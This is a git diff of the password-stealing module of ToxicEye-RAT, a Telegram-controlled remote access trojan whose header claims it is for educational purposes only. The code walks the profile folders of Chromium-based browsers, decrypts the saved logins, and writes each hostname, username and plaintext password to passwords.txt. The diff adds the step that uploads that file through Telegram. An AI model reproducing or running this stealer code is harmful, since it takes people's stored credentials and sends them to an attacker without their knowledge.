@@ -1,13 +1,12 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
 
 using System;
-using System.Collections.Generic;
 using System.IO;
 
 namespace TelegramRAT
@@ -15,8 +14,7 @@ namespace TelegramRAT
     internal class Passwords
     {
 
-        // Return list with arrays (hostname, usesrname, password)
-        public static List<Dictionary<string, string>> get()
+        public static void get()
         {
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
@@ -51,10 +49,10 @@ namespace TelegramRAT
                 l_a + "Yandex\\YandexBrowser" + u_s
             };
 
-            List<Dictionary<string, string>> passwords = new List<Dictionary<string, string>>();
             // Database
             string tempDatabaseLocation = "";
-
+            string filename = "passwords.txt";
+            string output = "[PASSWORDS]\n\n";
 
             // Search all browsers
             foreach (string browser in chromiumBasedBrowsers)
@@ -88,19 +86,19 @@ namespace TelegramRAT
                         break;
                     }
 
-                    // Show credentials
-                    Dictionary<string, string> credentials = new Dictionary<string, string>
-                    {
-                        ["hostname"] = hostname,
-                        ["username"] = Crypt.toUTF8(username),
-                        ["password"] = Crypt.toUTF8(Crypt.decryptChrome(password, browser))
-                    };
-                    passwords.Add(credentials);
+                    // Add
+                    output += "HOSTNAME: " + hostname + "\n"
+                           + "USERNAME: " + Crypt.toUTF8(username) + "\n"
+                           + "PASSWORD: " + Crypt.toUTF8(Crypt.decryptChrome(password, browser)) + "\n"
+                           + "\n";
+
                     continue;
                 }
                 continue;
             }
-            return passwords;
+            // Send
+            File.WriteAllText(filename, output);
+            telegram.UploadFile(filename, true);
         }
     }
 }
